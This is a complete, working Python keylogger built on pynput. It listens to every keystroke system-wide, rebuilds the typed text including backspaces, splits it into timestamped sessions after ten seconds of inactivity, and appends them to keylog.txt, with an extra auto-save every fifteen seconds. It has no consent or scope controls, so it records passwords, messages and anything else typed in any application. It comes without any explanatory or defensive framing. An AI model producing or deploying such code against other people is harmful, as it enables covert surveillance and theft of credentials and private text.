from pynput import keyboard
import time
import threading

# --- CONFIG ---
LOG_FILE = "keylog.txt"
INACTIVITY_LIMIT = 10      # seconds
AUTO_SAVE_INTERVAL = 15    # seconds (safety save)

# --- STATE ---
current_text = ""
start_time = None
last_key_time = None
session_active = False


# --- PROCESS KEY ---
def process_key(key):
    global current_text

    try:
        current_text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            current_text += " "
        elif key == keyboard.Key.enter:
            current_text += "\n"
        elif key == keyboard.Key.backspace:
            current_text = current_text[:-1]
        else:
            pass


# --- ON KEY PRESS ---
def on_press(key):
    global start_time, last_key_time, session_active

    current_time = time.time()

    if not session_active:
        start_time = current_time
        session_active = True

    last_key_time = current_time
    process_key(key)


# --- SAVE SESSION ---
def save_session():
    global current_text, start_time, session_active

    if current_text.strip() == "":
        return

    # Filter noise
    if len(current_text.strip()) < 2:
        current_text = ""
        session_active = False
        return

    end_time = time.time()
    duration = int(end_time - start_time)

    log_entry = (
        f"[{time.strftime('%H:%M:%S', time.localtime(start_time))} - "
        f"{time.strftime('%H:%M:%S', time.localtime(end_time))}] "
        f"({duration}s) {current_text}\n"
    )

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    # Reset
    current_text = ""
    session_active = False


# --- INACTIVITY MONITOR ---
def monitor_inactivity():
    global last_key_time, session_active

    while True:
        if session_active and last_key_time:
            if time.time() - last_key_time > INACTIVITY_LIMIT:
                save_session()
        time.sleep(1)


# --- AUTO SAVE (CRASH PROTECTION) ---
def auto_save():
    while True:
        time.sleep(AUTO_SAVE_INTERVAL)
        if session_active and current_text.strip():
            # temporary save without ending session
            with open(LOG_FILE, "a") as f:
                f.write(f"[AUTO-SAVE] {current_text}\n")


# --- MAIN ---
if __name__ == "__main__":
    # Start background threads
    threading.Thread(target=monitor_inactivity, daemon=True).start()
    threading.Thread(target=auto_save, daemon=True).start()

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        save_session()
        print("\nSession saved. Exiting...")